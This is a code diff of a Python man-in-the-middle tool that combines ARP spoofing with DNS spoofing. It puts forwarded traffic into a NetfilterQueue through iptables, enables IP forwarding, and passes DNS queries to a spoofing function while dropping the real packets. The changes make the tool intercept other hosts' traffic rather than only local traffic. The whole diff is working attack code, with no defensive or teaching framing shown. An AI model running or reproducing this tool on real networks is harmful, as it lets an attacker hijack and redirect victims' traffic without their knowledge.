@@ -16,7 +16,7 @@ import arp_spoofing
 #before packets leave the machine
 
 def setup_iptables():
-    os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
+    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
 def disable_port_forwarding():
     os.system("sudo sysctl -w net.ipv4.ip_forward=0")
@@ -28,13 +28,12 @@ def enable_port_forwarding():
     os.system("sudo sysctl -w net.ipv4.ip_forward=1")
 
 def setup_proxy():
-    dns_spoofing.arp_prep_automated()
     arp_thread_ = threading.Thread(target=arp_thread)
     arp_thread_.daemon = True
     arp_thread_.start()
 
     setup_iptables()
-    disable_port_forwarding()
+    enable_port_forwarding()
     
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, proxy)
@@ -42,7 +41,6 @@ def setup_proxy():
         nfqueue.run()
     except KeyboardInterrupt:
         undo_iptables()
-        enable_port_forwarding()
         nfqueue.unbind()
         dns_spoofing.dns_looping = False
         arp_thread_.join()
@@ -53,14 +51,8 @@ def arp_thread():
         time.sleep(5)
 
 
-packet_nr = 0
 def proxy(packet):
-    global packet_nr
-    packet_nr += 1
-    if packet_nr % 100 == 0:
-        dns_spoofing.arp_tick()
-
-    scapy_packet = scapy.IP(str(packet.get_payload()))
+    scapy_packet = scapy.IP(packet.get_payload())
     if dns_spoofing.isDnsQuery(scapy_packet):
         dns_spoofing.dns_spoof(scapy_packet)
         packet.drop()
